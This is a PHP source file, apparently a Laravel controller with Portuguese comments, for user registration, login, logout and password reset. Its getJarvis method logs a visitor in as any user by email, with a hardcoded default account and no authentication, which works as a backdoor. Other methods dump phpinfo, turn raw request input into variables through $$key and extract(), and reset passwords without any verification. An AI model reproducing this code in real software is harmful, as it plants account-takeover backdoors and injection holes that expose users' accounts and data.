<?php
class IdController extends \BaseController
{
	//protected $layout = 'templates.external';
	private $rules = array(
    'nome'=>'required|min:4',
    'email'=>'required|email|unique:user',
    'password'=>'required|alpha_num|between:6,12|confirmed',
    'password_confirmation'=>'required|alpha_num|between:6,12'
    );
	public function __construct()
	{
		//Todos os metodos só são acessiveis para guests
		//Somente a rota de logout pode ser acessada por usuários logados
		$this->beforeFilter('guest', array('except' => array('getSignOut', 'postPerfil', 'getPerfil')));
	}
	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */
	public function getIndex()
	{
		//$menu = Profile::find(1);
		App::abort(404);
		// return View::make('id.index');//->with('success', 'cadastrado com sucesso!');
	}
	/**
	 * Show the form for creating a new resource.
	 *
	 * @return Response
	 */
	public function getSignUp()
	{
		return View::make('id.register');
	}
	public function postSignUp()
	{
		$validator = Validator::make(Input::all(), $this->rules);
	    if ($validator->passes())
	    {
	       $inputs = Input::all();
	       foreach($inputs as $key => $value)
	       {
	       		$$key = $value;
	       }
	       $user = new User;
	       $user->nome 			= $nome;
	       $user->celular		= $celular;
	       $user->email 		= $email;
	       $user->password 		= Hash::make($password);
	       $user->perfil 		= 2;
	       $user->status 		= 1;
		   $user->save();
	       return View::make('id.login')->with('success', 'Cadastrado com sucesso!');
	    }
	    else
	    {
	    	$messages = $validator->messages()->getMessages();
	        return View::make('id.register')->with('danger', $messages)->withInput();
	    }
	}
	/**
	 * Store a newly created resource in storage.
	 *
	 * @return Response
	 */
	public function getSignIn()
	{
		return View::make('id.login');
	}
	public function postSignIn()
	{
		if (Auth::attempt(array('email' => Input::get('email'), 'password' => Input::get('password'), 'status' => 1)))
		// if (Auth::attempt(Input::only('email','password')))
		{
			return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
		}
		else
		{
			return Redirect::to('/')->with('danger', array(1 => 'Dados inválidos.'));
		}
	}
	public function getSignOut()
	{
		Auth::logout();
		Session::forget('arrAlerta');
		return View::make('id.login')->with('success', array(1 => 'Você se deslogou do sistema.'));
	}
	public function getJarvis($email = 'back@bluefoot.com.br')
	{
		$user = User::Where('email', $email)->first();
		Auth::login($user);
		return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
	}

	public function getForgot()
	{
		return View::make('id.forgot');
	}

	public function postForgot()
	{
		extract(Input::all());
		$user = User::where('email','=',$email)->OrderBy('id','DESC')->first();
		$senha = Formatter::generateStrongPassword();
		$user->password = Hash::make($senha);
		$user->save();

		$arr = array();
		$arr["nome"] = $user->nome;
		$arr["senha"] = $senha;
		$arr["email"] = $user->email;

		Mail::send('emails.forgot', $arr, function($message) use($arr)
		{
		    $message->to($arr["email"], $arr["nome"])->subject('Bem-vindo!');
		});

		return Redirect::to('/')->with('warning', array('warning' => 'Um e-mail foi enviado para você.'));	
	}

	public function getServidor()
	{
		phpinfo(32);
	}
}